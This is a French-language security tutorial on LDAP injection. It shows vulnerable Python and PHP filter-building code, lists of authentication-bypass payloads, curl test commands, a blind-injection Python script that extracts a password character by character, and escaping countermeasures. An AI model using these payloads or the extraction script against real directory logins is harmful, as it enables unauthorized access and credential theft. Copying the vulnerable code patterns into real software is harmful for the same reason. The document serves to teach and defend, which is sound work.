---
title: LDAP Injection
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [ldap, injection, active-directory, authentication-bypass, sécurité, web]
date: 2026-03-22
---

# LDAP Injection

L'injection LDAP exploite des requêtes LDAP (Lightweight Directory Access Protocol) construites dynamiquement à partir d'entrées utilisateur non filtrées. Elle permet de contourner l'authentification, énumérer des objets d'annuaire ou extraire des attributs sensibles.

## Rappel LDAP

```
LDAP est utilisé pour interroger des annuaires d'entreprise (Active Directory, OpenLDAP).

Structure d'un filtre LDAP :
(attribut=valeur)
(&(filtre1)(filtre2))    → ET logique
(|(filtre1)(filtre2))    → OU logique
(!(filtre))              → NON logique
(attribut=*)             → Tout (wildcard)

Exemples :
(uid=alice)
(&(uid=alice)(password=secret))
(&(objectClass=user)(sAMAccountName=alice))
```

## Code vulnérable et injections

```python
# Code Python vulnérable
username = request.form['username']
password = request.form['password']
ldap_filter = f"(&(uid={username})(password={password}))"
# → result = ldap_connection.search(base_dn, ldap_filter)

# Filtre normal pour alice:secret :
# (&(uid=alice)(password=secret))
```

### Bypass d'authentification

```
Payload dans le champ username :
  admin)(|(uid=*        → ferme le filtre uid et ajoute OU toujours vrai

Filtre résultant :
  (&(uid=admin)(|(uid=*)(password=n_importe_quoi))
  = (&(uid=admin)(|(toujours_vrai))) = (uid=admin) → auth réussie sans mot de passe

Autres payloads de bypass :
  *)(uid=*))(|(uid=*    → toujours vrai
  admin)(&              → ferme prématurément, crée un filtre toujours vrai
  *                     → wildcard → correspond à tous les utilisateurs
  admin)(password=*))(& → contourne la vérification du mot de passe
```

```bash
# Formulaire de login — tests d'injection
username: *
password: *
# → Si retourne un utilisateur → wildcard accepté → injectable

username: admin)(|(password=*))%00
password: anything
# %00 = null byte → tronque parfois le filtre restant

username: )(|(uid=admin)
# Tente de modifier la logique du filtre
```

### Énumération aveugle (Blind LDAP Injection)

```python
# Si la page retourne seulement succès/échec, on peut extraire des informations
# bit par bit en testant des attributs

# Tester si un utilisateur existe
username = "admin)(uid=admin)"  # True si admin existe
username = "admin)(uid=nonexistant)"  # False

# Extraire le mot de passe caractère par caractère
# Tester si le mot de passe commence par 'a'
username = "alice)(password=a*"  # True si password commence par 'a'

# Script d'extraction
import requests, string

def test_payload(payload):
    r = requests.post("https://target.com/login",
                      data={"username": payload, "password": "x"})
    return "Welcome" in r.text  # Adapter selon la réponse

charset = string.ascii_lowercase + string.digits + "!@#$"
password = ""
while True:
    found = False
    for char in charset:
        payload = f"alice)(password={password}{char}*"
        if test_payload(payload):
            password += char
            found = True
            print(f"[+] {password}")
            break
    if not found:
        break

print(f"[+] Mot de passe : {password}")
```

### Extraction d'attributs LDAP

```
Attributs sensibles dans Active Directory :
  userPassword          → mot de passe (si stocké en clair dans OpenLDAP)
  unicodePwd            → mot de passe haché AD
  sAMAccountName        → nom d'utilisateur Windows
  mail                  → adresse email
  memberOf              → groupes d'appartenance
  adminCount            → compte protégé par SDProp
  servicePrincipalName  → SPN (Kerberoastable)
  msDS-AllowedToDelegate → délégation Kerberos
  description           → parfois contient des mots de passe en clair !

Extraction blind d'un attribut :
username = "alice)(description=P*     → True si description commence par 'P'
```

## LDAP Injection dans différents contextes

### Active Directory — Python avec ldap3

```python
# Code vulnérable avec ldap3
from ldap3 import Server, Connection

server = Server("ldap://dc01.domaine.local")
conn = Connection(server, f"CN={username},DC=domaine,DC=local", password)
# Si username = "admin,DC=domaine,DC=local)(|(uid=*" → manipulation du DN

# Recherche vulnérable
conn.search("DC=domaine,DC=local", f"(sAMAccountName={username})")
# Si username = "*)(|(cn=*" → retourne tous les objets
```

### PHP — ldap_search

```php
// Code vulnérable
$filter = "(&(uid=" . $_POST['username'] . ")(userPassword=" . $_POST['password'] . "))";
$result = ldap_search($conn, $base_dn, $filter);

// Injection → bypass d'auth
// username: *)(|(uid=*  → filtre cassé → retourne n'importe quel utilisateur
```

### Login LDAP — payloads courants

```
Champ username :
  *
  admin*
  *)(&
  *)(|(uid=*
  admin)(|(uid=*)
  )(|(password=*))(

Champ password (si vérifié dans le filtre LDAP) :
  *
  )(|(password=*)
  %00 (null byte)
```

## Détection

```bash
# Test manuel — injecter des métacaractères LDAP dans tous les champs
# Métacaractères : ( ) * \ NUL (ASCII 0) | & = !

# Tester le wildcard
curl -X POST https://target.com/login -d "username=*&password=anything"

# Tester l'injection logique
curl -X POST https://target.com/login -d "username=admin)(|(uid=*)&password=x"

# Observer les différences de réponse :
# → Erreur LDAP → injectable
# → Login réussi avec wildcard → injectable

# Burp Suite — envoyer les payloads dans Intruder
# Liste : SecLists/Fuzzing/LDAP-Injection.txt
```

## Contre-mesures

```python
# Python — utiliser des filtres avec escape
from ldap3.utils.conv import escape_filter_chars

# Dangereux
ldap_filter = f"(uid={username})"

# Sûr — échapper les métacaractères LDAP
safe_username = escape_filter_chars(username)
ldap_filter = f"(uid={safe_username})"
# escape_filter_chars remplace ( ) * \ par leur encodage \28 \29 \2a \5c

# Java — javax.naming.directory avec des attributs séparés
// Ne jamais construire le filtre par concaténation
// Utiliser des requêtes paramétrées si la bibliothèque le supporte

// PHP — ldap_escape()
$safe = ldap_escape($_POST['username'], "", LDAP_ESCAPE_FILTER);
$filter = "(&(uid=$safe)(objectClass=person))";
```

```
Règles générales :
✓ Échapper les métacaractères LDAP : ( ) * \ NUL | & = !
✓ Valider le type des entrées (username = uniquement alphanumérique)
✓ Utiliser des requêtes paramétrées (si la bibliothèque LDAP le supporte)
✓ Principe du moindre privilège pour le compte LDAP de l'application
✓ Ne pas afficher les erreurs LDAP verboses en production
✓ Logs : monitorer les filtres LDAP anormalement complexes
```
